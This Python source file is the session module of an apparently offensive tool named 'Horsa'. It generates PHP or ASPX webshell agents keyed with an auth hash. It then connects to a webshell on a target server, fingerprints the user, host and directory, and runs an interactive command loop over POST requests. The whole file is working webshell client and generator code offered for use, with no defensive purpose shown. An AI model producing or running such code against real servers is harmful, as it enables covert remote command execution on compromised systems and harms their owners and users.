from colorama import Fore
from core.handler import Handler
from core.request import Request
from core.config import PSEUDO_SHELL, PHP_AGENT, ASPX_AGENT, OUTPUT_DIR
import hashlib
import os
from urllib.parse import urlparse

class Session:
    
    @staticmethod
    def calculate_sha256(string):
        sha256_hash = hashlib.sha256()
        sha256_hash.update(string.encode())
        return sha256_hash.hexdigest()

    def __init__(self, url, ua, lang, key):
        print (Fore.YELLOW + "[*]" + Fore.WHITE +" Initializing Horsa")
        self.url = url
        self.ua = ua
        self.lang = lang
        self.key = key
        self.hash = self.calculate_sha256(key)  # Corrected the function call to use 'self.calculate_sha256'
        self.request = Request(self.url, self.ua, self.key, self.hash)
        self.shell = PSEUDO_SHELL

    def check_ws(self):
        try:
            status_code = self.request.get_status()
            if status_code == 200:
                print(Fore.GREEN + "[+]" + Fore.WHITE + " Horsa webshell found on target")
                username, hostname, pwd = self.build_shell()
                if username and hostname and pwd:
                    self.shell = PSEUDO_SHELL.replace("USERNAME", username).replace("HOST", hostname).replace("PWD", pwd)
                else:
                    self.shell = "shell> "
                    print(Fore.RED + "[!]" + Fore.WHITE + " Horsa failed to retrieve target's environment")
                print(Fore.YELLOW + "[*]" + Fore.WHITE + " Use :help to list built-in commands")
            else:
                print(Fore.RED + "[!]" + Fore.WHITE + " Code " + str(status_code) + ": Horsa webshell is not responding")
                print(Fore.BLUE + "[+]" + Fore.WHITE +" Exiting now!")
                exit(0)
        except Exception as e:
            print(Fore.RED + "[!]" + Fore.WHITE + " An error occurred: " + str(e))

    def build_shell(self):
        handler = Handler(self.lang, ':username')
        username = self.request.send_POST(handler.get_command())
        handler = Handler(self.lang, ':hostname')
        hostname = self.request.send_POST(handler.get_command())
        handler = Handler(self.lang, ':pwd')
        pwd = self.request.send_POST(handler.get_command())
        return username, hostname, pwd

    def interact(self):
        print("+ target: " + self.url)
        print("+ user-agent: " + self.ua)
        print("+ language: " + self.lang)
        print("+ auth-key: " + self.key)
        while True:
            try:
                user_input = str(input(Fore.RED + self.shell + Fore.WHITE))
                handler = Handler(self.lang, user_input)
                cmd = handler.get_command()
                if cmd:
                    response = self.request.send_POST(cmd)
                    if response.endswith('\n'):
                        print(response, end="")
                    else:
                        print(response)
            except KeyboardInterrupt:
                quit_message  = input("\n[*] Confirm you really want to quit (y/n)\n")
                if quit_message == "y":
                    print(Fore.BLUE + "[+]" + Fore.WHITE +" Exiting now!")
                    exit(0)

            except Exception as e:
                print(Fore.RED + "[!]" + Fore.WHITE + " An error occurred when running the current session: " + str(e))

    def generate(self):
        print (Fore.YELLOW + "[*]" + Fore.WHITE +" Generating an Horsa webshell")
        parsed_url = urlparse(self.url)
        filename = os.path.basename(parsed_url.path)
        print("+ filename: " + filename)
        print("+ language: " + self.lang)
        print("+ auth-key: " + self.key)
        #try:
        if self.lang == "php":
            pld = Handler.write_from_file(PHP_AGENT)
            out = pld.replace(b"<HASH>", self.hash.encode()).replace(b"<KEY>", self.key.encode())
            Handler.write_to_file(OUTPUT_DIR + filename, out)
            print(Fore.GREEN + "[+]" + Fore.WHITE + " Horsa webshell in php available at " + OUTPUT_DIR + filename)
            print (Fore.GREEN + "[+]" + Fore.WHITE + " You may deploy this webshell then run Horsa on --interact mode")
        elif self.lang == "aspx":
            pld = Handler.write_from_file(ASPX_AGENT)
            out = pld.replace(b"<HASH>", self.hash.encode()).replace(b"<KEY>", self.key.encode())
            Handler.write_to_file(OUTPUT_DIR + filename, out)
            print(Fore.GREEN + "[+]" + Fore.WHITE + " Horsa webshell in aspx available at " + OUTPUT_DIR + filename)
            print (Fore.GREEN + "[+]" + Fore.WHITE + " You may deploy this webshell then run Horsa on --interact mode")
        else:
            print(Fore.RED + "[!]" + Fore.WHITE + " Unknown language, use --lang php or --lang aspx when running Horsa") 
        #except Exception as e:
                #print(Fore.RED + "[!]" + Fore.WHITE + " An error occurred during the webshell generation: " + str(e))
        print(Fore.BLUE + "[+]" + Fore.WHITE +" Exiting now!")
        exit(0)